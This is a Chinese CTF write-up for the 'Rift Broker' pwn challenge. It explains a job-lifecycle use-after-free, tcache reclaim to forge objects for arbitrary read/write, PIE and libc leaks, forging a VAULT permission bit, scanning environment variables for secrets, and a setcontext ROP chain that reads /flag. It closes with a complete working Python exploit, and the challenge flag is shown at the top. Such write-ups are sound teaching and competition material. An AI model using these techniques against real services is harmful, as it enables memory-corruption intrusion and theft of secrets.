# Rift Broker WP

## flag:``flag{a93a0a34-b0d6-46e5-8aad-b4a405b36bff}``

#### 解题人：种花草的貔貅

## 1. 题目

Rift Broker 是一个 TCP 资源/任务调度服务，默认监听 `:1337`。它不是传统栈溢出题，而是“协议状态机 + C++ 对象生命周期”类漏洞。

二进制保护全开：

- PIE
- Full RELRO
- Canary
- NX
- glibc 2.43

因此不能直接打栈 ROP，整体思路是：

> 逻辑漏洞 → 任意读写 → 伪造权限 → 读取 vault / flag

附图：
![](/鲲鹏杯/Rift%20Broker/保护.png)

---

## 2. 关键对象与生命周期

### Resource

一个“代”（generation），大小为 `0x110` 的 chunk，布局包含：

- vtable
- 状态
- 内联 payload，容量 `0xb8`

### Capability

权限票据，同样为 `0x110` chunk，包含：

- 指向 `Resource*`
- mask：
  - `1 = READ`
  - `2 = WRITE`
  - `4 = DELETE`
  - `8 = VAULT`

### Job

两阶段任务：

- `SUBMIT`：停放任务
- `RESUME`：执行任务

停放时，Job 会保存提交那一刻的 `Resource*`。

### 生命周期

资源生命周期为：

```text
REVOKE → DRAIN → ROTATE → RECLAIM
```

其中 `RECLAIM` 会释放被退休的代。

### vault

资源 1，payload 内容为：

```text
<classified: requires READVAULT>
```

本地构建中这是占位符。VAULT 位不能通过正常 `GRANT` 获得。

---

## 2. 漏洞发现与根本原因

先跑通协议，确认各命令行为：

```text
CREATE / LIST / GRANT / SUBMIT / WAIT / RESUME / RESULT /
REVOKE / DRAIN / ROTATE / RECLAIM
```

关键现象：

1. `SUBMIT` 一个 `SYNC` 任务并停放；
2. 走完生命周期，把该代 `RECLAIM`；
3. 再 `RESUME` 这个旧任务；
4. 进程段错误。

用 gdb 查看崩溃点：

- worker 中 `r13 = [job+0x40]`，即提交时的 `Resource*`；
- 该内存已被 free，首 8 字节变成 tcache 的 safe-link 值；
- 于是 `[[r13]+0x18]` 取到垃圾地址，间接调用崩溃。

根本原因一句话：

> 停在队列里的 Job 持有 Resource，而 ROTATE/RECLAIM 可以把这个 Resource 释放掉，Job 变成悬空指针，形成 UAF。

worker 执行路径如下：

```
rax = [r13]            ; 取 vtable
rax = [rax+0x18]       ; 取回调
cmp rax, 0x20120       ; 等于“空回调”就跳过
call rax               ; 否则 fn(r13, [r13+0x28], [r13+0x40])
```

因此只要伪造对象，使 `[fake]` 指向一个 `+0x18 != 0x20120` 的假 vtable，就能获得一次受控间接调用。实际利用中，也可以把 `[fake]` 指向真实 Resource vtable `pie+0x1048a0`，使 `+0x18 == 0x20120`，从而跳过回调，直接执行 op。

---

## 3. 利用原语

### 3.1 用同尺寸分配回收被释放的 Resource

Resource chunk 为 `0x110`，payload 内联，最大 `0xb8`。

WRITE 任务的参数缓冲是精确长度分配。提交一条 WRITE 且参数长度为 `0x100`，就能落到同一个 tcache bin，占用刚被 free 的 Resource 地址，参数内容完全由 hex 控制。

要点：

> 所有命令走同一条连接/同一个 worker 线程，tcache 才能命中。

### 3.2 伪造 Resource 实现任意读写

伪造对象中设置：

- `[fake+0x28]`：目标地址
- `[fake+0x30]`：长度
- `[fake]`：真实 Resource vtable，即 `pie+0x1048a0`

这样 `+0x18 == 0x20120`，跳过回调，直接执行 op：

- `GREAD`：读 `[[fake+0x28], +len]`，实现任意读；
- `GWRITE`：把任务参数写到 `[fake+0x28]`，实现任意写。

### 3.3 先泄露，再利用

直接伪造需要 PIE 地址，所以先不解密。

第一次 UAF 用 Capability 对象回收该 chunk：`GRANT` 几次即可。随后 stale `GREAD` 会把 `cap->Resource*` 指向的 Resource 整块 184 字节读出来，其中天然带有：

- Resource vtable → PIE 基址；
- payload 指针 → heap 地址。

有了 PIE 后就能稳定伪造；再读 GOT，地址为 `pie+0x10b000`，反推 libc 基址。

---

## 4. 主线：伪造 VAULT 权限

资源表在：

```text
pie+0x10c070
```

第 0 项就是 vault 的 `Resource*`。

Capability 布局实测如下：

| 偏移 | 含义 |
|---|---|
| `+0x08` | cap id |
| `+0x10` | resource id |
| `+0x18` | mask，bit3 = VAULT |
| `+0x28` | Resource* |
| `+0x40` | session |

利用任意写完成：

```text
cap+0x10 = 1
cap+0x18 |= 8
cap+0x28 = vault
session+0x10 = 1
```

其中 `session+0x10 = 1` 用于绕过：

```text
ERR vault access not enabled for session
```

然后提交：

```text
SUBMIT 1 <cap> READVAULT
```

即可直接回显 vault payload。

本地回显的是占位符，这正是作者分发的“假 flag 构建”特征；真 flag 应在动态实例的 vault 里。

---

## 5. 备用路径

真实部署不一定把 flag 放在 vault，因此准备两条备用路径。

### 5.1 环境变量

流程：

1. 读 GOT 拿 libc 基址；
2. 通过 `environ` 找到 envp；
3. 遍历环境变量，命中：
   - `GZCTF_FLAG`
   - `FLAG`

### 5.2 `/flag` 文件

实测 `execve` 被 seccomp 拦截，触发 `SIGSYS`，但 `open/read` 允许。

因此用 `setcontext` 恢复寄存器做 ROP：

```
ret
→ pop rdi; "/flag"
→ pop rsi; 0
→ pop rax; 2
→ syscall(open)
→ xchg eax, edi      ; fd → rdi
→ pop rsi; vault_payload
→ pop rax; 0
→ syscall(read)
→ pause
```

把 `/flag` 读进 vault 的 payload 缓冲，再用现成的任意读回。全程在一个 TCP 连接里完成，不需要反弹 shell。

---

## 6. 注意事项

1. **worker 被停放任务占满**  
   每条 `SUBMIT` 都占一个 worker，攒够 6 个后续命令就全卡住。用完 fake 任务要 `CANCEL`。

2. **客户端超时污染**  
   makefile 一次 `socket.timeout` 就报废，改成自己维护 byte buffer + `recv`。

3. **读栈越界**  
   从 `environ` 读字符串时按“本页剩余长度”截断，否则跨过栈顶页会把服务读崩。

4. **setcontext 的注意事项**  
   `uc_mcontext.fpregs`（`+0xe0`）必须是非空可读指针，否则 `fldenv` 直接段错误；ROP 起始要放一条 `ret`，不能让 `pop rdi` 把自己弹进 `rdi`。

5. **越界写不要贪多**  
   read 到 vault payload 只能写 `0xb8`，多 1 字节就压到下一个 chunk 头。

---

## 7. 验证情况

三条路径都在 Kali 本地用“自己植入的测试 flag”跑通：

- vault
- 环境变量
- `/flag`

并验证了无 flag 时优雅失败、服务不崩。

```text
qa_verify 5/5 PASS
```

注意：本地的 broker 是占位符构建，真 flag 只存在于动态实例。

---

## 8. 总结

本题核心利用链：

```text
Job 悬空 Resource*
→ UAF
→ 同尺寸 WRITE 参数回收 Resource chunk
→ 伪造 Resource
→ 任意读写
→ 泄露 PIE / libc
→ 伪造 Capability 的 VAULT 权限
→ 读取 vault
```

备用路径为环境变量与 `/flag` 文件读取。

由于保护全开，不能直接打栈 ROP；真正的突破口是协议状态机与 C++ 对象生命周期管理中的 UAF，以及后续通过 tcache 同尺寸回收构造的任意读写能力。

## 9. exp
```py
import sys, struct, os, time, re

def socket_connect(host, port):
    import socket
    return socket.create_connection((host, port), timeout=10)

class Conn:
    def __init__(self, host, port, timeout=20.0):
        self.s = socket_connect(host, port)
        self.s.settimeout(timeout)
        self.buf = b""
        self.banner = self.line()
    def line(self):
        while b"\n" not in self.buf:
            try:
                d = self.s.recv(65536)
            except socket.timeout:
                return "<TIMEOUT>"
            except Exception as e:
                return "<ERR %s>" % e
            if not d:
                return "<EOF>"
            self.buf += d
        ln, self.buf = self.buf.split(b"\n", 1)
        return ln.decode("latin-1").rstrip("\r")
    def cmd(self, c):
        try:
            self.s.sendall(c.encode("latin-1") + b"\n")
        except Exception as e:
            return "<SENDFAIL %s>" % e
        return self.line()

class Rift:
    def __init__(self, host, port, timeout=20.0):
        self.c_ = Conn(host, port, timeout)
        self.n = 0
        self.pie = None
        self.heap = None
        self.vt = None
        self.leak = None
        self._leak()
    def c(self, s):
        return self.c_.cmd(s)
    def _mkres(self, tag):
        rid = self.c("create " + tag).split("id=")[-1]
        cap = self.c("grant %s 7" % rid).split("cap=")[-1]
        return rid, cap
    def _fake(self, ptr, n):
        f = bytearray(0x100)
        struct.pack_into("<Q", f, 0x00, self.vt)
        struct.pack_into("<Q", f, 0x08, 2)
        struct.pack_into("<Q", f, 0x10, 0x3e8)
        struct.pack_into("<Q", f, 0x18, 1)
        struct.pack_into("<Q", f, 0x20, 2)
        struct.pack_into("<Q", f, 0x28, ptr)
        struct.pack_into("<Q", f, 0x30, n)
        struct.pack_into("<Q", f, 0x38, 0xb8)
        struct.pack_into("<Q", f, 0x40, 0)
        return bytes(f)
    def _free_gen(self, rid, cap, op):
        j = self.c("submit %s %s %s" % (rid, cap, op)).split("job=")[-1]
        self.c("wait " + j)
        s = self.c("submit %s %s sync" % (rid, cap)).split("job=")[-1]
        self.c("wait " + s)
        self.c("revoke " + rid); self.c("drain " + rid)
        self.c("resume " + s); self.c("result " + s)
        self.c("rotate " + rid); self.c("reclaim")
        return j
    def _prim(self, target, n, wdata=None):
        rid, cap = self._mkres("P%d" % self.n); self.n += 1
        self.c("patch %s %s %s" % (rid, cap, b"AAAA".hex()))
        op = "gread 0" if wdata is None else "gwrite 0 " + wdata.hex()
        j = self._free_gen(rid, cap, op)
        fk = self.c("submit %s %s write %s" % (rid, cap, self._fake(target, n).hex())).split("job=")[-1]
        self.c("resume " + j)
        r = self.c("result " + j)
        self.c("cancel " + fk)
        return r
    def read(self, addr, n):
        r = self._prim(addr, n)
        if not r.startswith("OK data "):
            raise RuntimeError("read %#x failed: %s" % (addr, r))
        return bytes.fromhex(r.split("OK data ")[1])
    def write(self, addr, data):
        return self._prim(addr, len(data), wdata=data)
    def read64(self, addr):
        return struct.unpack_from("<Q", self.read(addr, 8), 0)[0]
    def _leak_once(self, grants):
        rid, cap = self._mkres("LK")
        self.c("patch %s %s %s" % (rid, cap, b"ABCDEFGH".hex()))
        jg = self.c("submit %s %s gread 0" % (rid, cap)).split("job=")[-1]
        self.c("wait " + jg)
        js = self.c("submit %s %s sync" % (rid, cap)).split("job=")[-1]
        self.c("wait " + js)
        self.c("revoke " + rid); self.c("drain " + rid)
        self.c("resume " + js); self.c("result " + js)
        self.c("rotate " + rid); self.c("reclaim")
        for _ in range(grants):
            self.c("grant %s 7" % rid)
        self.c("resume " + jg)
        r = self.c("result " + jg)
        return bytes.fromhex(r.split("OK data ")[1])
    def _leak(self):
        """Reclaim the freed generation with Capability objects; GREAD then dumps
        the Resource that cap->res points at (vtable + heap pointer)."""
        for grants in (3, 8, 16):
            d = self._leak_once(grants)
            vt = struct.unpack_from("<Q", d, 0)[0]
            if vt > 0x400000000000 and (vt & 0xfff) in (0x8a0, 0x8d0, 0x900, 0x870):
                self.leak = d
                self.vt = vt
                self.heap = struct.unpack_from("<Q", d, 0x28)[0]
                self.leak_is_res = d[0x48:0x50] == b"ABCDEFGH"
                return
        raise RuntimeError("leak did not land on a real vtable (got %#x)" % struct.unpack_from("<Q", d, 0)[0])
    def resolve_pie(self):
        """The leaked first qword is a real vtable pointer.  Which vtable it is
        tells us the relocation of PIE; validate by looking for ELF magic."""
        for off in (0x1048a0, 0x1048d0, 0x104900, 0x104870):
            cand = self.vt - off
            if cand & 0xfff:
                continue
            try:
                if self.read(cand, 4) == b"\x7fELF":
                    self.pie = cand
                    return cand
            except Exception:
                continue
        # last resort: assume a Resource vtable
        self.pie = self.vt - 0x1048a0
        return self.pie
    def scratch(self):
        """A known writable 0xb8 buffer for ROP staging."""
        if getattr(self, "leak_is_res", False) and self.heap:
            return self.heap
        rid = self.c("create SCR").split("id=")[-1]
        self.c("grant %s 7" % rid)
        entry = self.read(self.pie + 0x10c070 + 0x30 * (int(rid) - 1), 8)
        res = struct.unpack_from("<Q", entry, 0)[0]
        return self.read64(res + 0x28)

def find_flag(text):
    m = re.search(r"[A-Za-z0-9_]{2,30}\{[^}\r\n]{1,200}\}", text)
    return m.group(0) if m else None

def libc_base(t):
    from pwn import ELF
    here = os.path.dirname(os.path.abspath(__file__))
    libc = ELF(os.path.join(here, "libc.so.6"), checksec=False)
    got = t.read(t.pie + 0x10b000, 0x1000)
    qs = [struct.unpack_from("<Q", got, i)[0] for i in range(0, len(got), 8)]
    syms = [(n, int(s)) for n, s in libc.symbols.items() if int(s)]
    cands = {}
    for v in qs:
        if 0x700000000000 <= v <= 0x800000000000:
            for n, off in syms:
                b = v - off
                if not (b & 0xfff) and 0x700000000000 <= b <= 0x800000000000:
                    cands.setdefault(b, set()).add(n)
    if not cands:
        raise RuntimeError("libc base not found")
    return libc, max(cands.items(), key=lambda kv: len(kv[1]))[0]

def env_flags(t, libc, base):
    out = []
    envp = t.read64(base + int(libc.symbols["environ"]))
    arr = t.read(envp, 0x200)
    for i in range(0, len(arr), 8):
        p = struct.unpack_from("<Q", arr, i)[0]
        if p == 0:
            break
        if not (0x7f0000000000 <= p <= 0x800000000000):
            continue
        n = min(0x100, 0x1000 - (p & 0xfff))
        try:
            s = t.read(p, n).split(b"\x00")[0]
        except RuntimeError:
            continue
        out.append(s.decode("latin-1", "replace"))
    return out

def rce_read(t, libc, base, vault, path):
    """setcontext -> open(path) / read(fd, vault_payload, 0xb8) then pause()."""
    A = lambda x: base + x
    setcontext = A(int(libc.symbols["setcontext"]))
    pause = A(int(libc.symbols["pause"]))
    pop_rdi = A(0x11b9fa)
    pop_rsi = A(0x5c067)
    pop_rax = A(0xe5b47)
    syscall_ret = A(0xa0966)
    xchg_eax_edi = A(0x1ad436)
    ret = A(0x289fe)
    buf = t.scratch()
    dst = vault + 0x48
    blob = bytearray(0xa0)
    struct.pack_into("<Q", blob, 0x18, setcontext)
    pb = path.encode() + b"\x00"
    blob[0x20:0x20 + len(pb)] = pb
    chain = [pop_rdi, buf + 0x20,
             pop_rsi, 0,
             pop_rax, 2,
             syscall_ret,
             xchg_eax_edi,
             pop_rsi, dst,
             pop_rax, 0,
             syscall_ret,
             pause]
    for i, q in enumerate(chain):
        struct.pack_into("<Q", blob, 0x30 + 8 * i, q)
    t.write(buf, bytes(blob))
    fake = bytearray(0x100)
    struct.pack_into("<Q", fake, 0x00, buf)
    struct.pack_into("<Q", fake, 0x68, 0)
    struct.pack_into("<Q", fake, 0x70, 0)
    struct.pack_into("<Q", fake, 0x88, 0xb8)
    struct.pack_into("<Q", fake, 0xa0, buf + 0x30)
    struct.pack_into("<Q", fake, 0xa8, ret)
    struct.pack_into("<Q", fake, 0xe0, buf + 0xa0)
    rid, cap = t._mkres("XR%d" % t.n); t.n += 1
    t.c("patch %s %s %s" % (rid, cap, b"AAAA".hex()))
    j = t._free_gen(rid, cap, "gread 0")
    t.c("submit %s %s write %s" % (rid, cap, fake.hex()))
    t.c("resume " + j)
    time.sleep(0.6)
    return t.read(dst, 0xb8)

def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
    t = Rift(host, port)
    pie = t.resolve_pie()
    print("[*] leak vt=%#x heap=%#x is_resource=%s" % (t.vt, t.heap, t.leak_is_res))
    print("[*] pie  = %#x" % pie)

    vault = t.read64(pie + 0x10c070)
    print("[*] vault= %#x" % vault)
    d = t.read(vault + 0x48, 0xb8)
    txt = d.split(b"\x00")[0].decode("latin-1", "replace")
    print("[*] vault payload: %r" % txt[:120])
    f = find_flag(txt)
    if f:
        print("[+] FLAG:", f)
        return 0

    libc, base = libc_base(t)
    print("[*] libc = %#x" % base)

    for s in env_flags(t, libc, base):
        if "flag" in s.lower() or "ctf" in s.lower():
            print("[*] ENV: %s" % s)
            f = find_flag(s)
            if f:
                print("[+] FLAG:", f)
                return 0

    for path in ("/flag", "/flag.txt"):
        try:
            d = rce_read(t, libc, base, vault, path)
            txt = d.split(b"\x00")[0].decode("latin-1", "replace")
            print("[*] %s -> %r" % (path, txt[:120]))
            f = find_flag(txt)
            if f:
                print("[+] FLAG:", f)
                return 0
        except Exception as e:
            print("[-] %s: %s" % (path, e))
            break
    print("[-] no flag found")
    return 1

if __name__ == "__main__":
    sys.exit(main())
```